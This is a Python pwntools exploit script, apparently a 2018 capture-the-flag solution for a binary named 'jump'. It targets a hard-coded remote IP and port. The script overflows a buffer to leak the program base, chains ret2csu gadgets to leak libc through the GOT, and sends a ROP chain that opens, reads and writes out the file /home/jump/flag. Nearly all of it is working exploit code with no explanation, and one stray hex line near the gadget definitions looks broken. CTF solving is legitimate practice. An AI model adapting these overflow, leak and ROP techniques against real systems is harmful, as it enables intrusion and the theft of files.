#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./jump"
os.environ["LD_LIBRARY_PATH"]="./"
elf=ELF(pwn_file)
libc=ELF("./libc.so.6")

if len(sys.argv)==1:
    r=process("./jump")
    pid=r.pid
else:
    r=remote("178.128.217.117",31336)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    log.debug("libc address:0x%x"%libc.address)
    log.debug("elf address:0x%x",elf.address)
    pause()

payload="aaaaaaaa"*0x7f+"\xE0"
r.sendlineafter("Give me input:",payload)
r.recvuntil("a"*0x3f8)
elf.address=u64(r.recv(6)+"\x00\x00")-0xce0

def ret2csu(rdi,rsi,rdx,func_got):
    return p64(0)+p64(1)+p64(func_got)+p64(rdi)+p64(rsi)+p64(rdx)+p64(elf.address+0xd80)+"a"*8

base=elf.address+0x2020b8
payload="12345678"*3+p64(elf.address+0xd9a)+ret2csu(0,base,0x100000,elf.got["read"])

payload+=p64(111)+p64(base)+"a"*0x20+p64(elf.address+0xc2d)

r.send(payload.ljust(0x3f8,'1')+p64(elf.address+0xd9d))

f={
    0:p64(base+0x200)+p64(elf.address+0xcfb),
    0x10:p64(elf.address+0xd9a)+p64(0)+p64(1)+p64(elf.got["puts"])+p64(0)*3+p64(0xd89+elf.address)+"a"*8+\
            ret2csu(0,base+0xc8,0x1000,elf.got["read"]),
    0x200-0x20:p64(elf.got["malloc"]),
    0x2f8:p64(elf.address+0xd34),
}
r.clean()
r.sendline(fit(f,filler="\x00"))
libc.address=u64(r.recvline()[:-1]+"\x00\x00")-libc.sym["malloc"]

pop_rdi=0x000000000002155f+libc.address
pop_rdx_rsi=0x00000000001306d9+libc.address
pop_rax=0x00000000001cf9a0+libc.address
mov_rdi_rax=1
0x00000000001415dd
base=base+0xc8
f={
    0:p64(pop_rdi)+p64(base+0x200)+p64(pop_rdx_rsi)+p64(0)+p64(0)+p64(pop_rax)+p64(2)+p64(libc.address+0x11b837)+\
        p64(pop_rdx_rsi)+p64(base+0x1a0)+p64(1)+p64(0x00000000000b3437+libc.address)+p64(0x00000000001ab804+libc.address)+\
        p64(pop_rdx_rsi)+p64(0x100)+p64(base+0x300)+p64(libc.sym["read"])+p64(pop_rdi)+p64(1)+\
        p64(pop_rdx_rsi)+p64(0x100)+p64(base+0x300)+p64(libc.sym["write"]),
    0x200:"/home/jump/flag\x00"
}
r.sendline(fit(f,filler="\x00"))
r.interactive()





